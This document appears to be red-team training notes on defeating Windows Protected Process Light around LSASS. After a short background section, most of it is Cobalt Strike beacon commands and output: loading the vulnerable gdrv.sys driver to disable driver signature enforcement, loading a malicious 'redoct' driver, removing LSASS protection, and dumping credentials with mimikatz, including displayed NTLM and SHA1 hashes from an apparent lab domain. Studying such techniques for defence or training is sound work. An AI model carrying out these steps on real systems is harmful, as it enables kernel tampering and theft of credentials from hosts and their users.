
Protected Process (PP) and Protected Process Light (PPL) is a relatively new mechanism on Windows which was first designed as protection for DRM (Digital Rights Management).  The idea was to allow media players to read Blu-Ray discs, but not copy the content.  It worked fundamentally by limiting the access you could obtain to a protected process, such as PROCESS_QUERY_LIMITED_INFORMATION or PROCESS_TERMINATE, but not PROCESS_VM_READ or anything else that would allow you to circumvent the DRM requirements.

Since then, the technology has been expanded to help protect other Windows processes - notably LSASS and AV engines.  For example, we get access denied when trying to obtain a handle with enough privileges to read LSASS memory.

# Bypassing DSE

* Can bypass the LSASS protected handle by disabling DSE (driver signature enforcement) and creating an arbitrary kernel memory write primitive. This can be done by loading a known, vulnerable driver, using it to disable DSE, loading a malicious driver, and then re-enabling DSE.

```
beacon> upload C:\Tools\cobaltstrike\gdrv\gdrv.sys
beacon> run sc create gdrv type= kernel binPath= C:\Windows\System32\drivers\gdrv.sys
beacon> run sc start gdrv

SERVICE_NAME: gdrv 
        TYPE               : 1  KERNEL_DRIVER  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
```

```
beacon> disable_dse
[+] DSE disabled
```

* We can then load our malicious driver.

```
beacon> run sc start redoct

SERVICE_NAME: redoct 
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
```

* We'll need to make sure that we re-enable DSE as soon as possible as to prevent a BSOD.

```
beacon> enable_dse
[+] DSE enabled
```

* We could also then unload the `gdrv` driver and remove it from the system.

```
beacon> run sc stop gdrv
beacon> run sc delete gdrv
beacon> rm gdrv.sys
```

# Dumping LSASS


* We can simply use `unprotect_process 652` to remove write protection from the LSASS. This has a `bof` and `aggressor script` that will call the correct IOCTL from the RedOctober driver.

```
beacon> ppenum 652
[*] Running PPEnum against PID 652

Type   : PsProtectedTypeProtectedLight
Signer : PsProtectedSignerLsa

beacon> unprotect_process 652
[+] host called home, sent: 2498 bytes

beacon> ppenum 652
[*] Running PPEnum against PID 652

Type   : PsProtectedTypeNone
Signer : PsProtectedSignerNone
```

* We can then simply call `mimikatz` and execute what is needed.

```
beacon> mimikatz !sekurlsa::logonpasswords

Authentication Id : 0 ; 1415530 (00000000:0015996a)
Session           : RemoteInteractive from 2
User Name         : bturner
Domain            : ACME
Logon Server      : DC
Logon Time        : 5/16/2023 3:05:35 PM
SID               : S-1-5-21-2006696020-36449419-3390662055-1106
	msv :	
	 [00000003] Primary
	 * Username : bturner
	 * Domain   : ACME
	 * NTLM     : 1804bfd7e057f1b37d5bba093c594d1e
	 * SHA1     : da4585eb8811a5a291ff1c61603b42cc59996079
	 * DPAPI    : 12944985316c14d13757dbab27ab0f24
```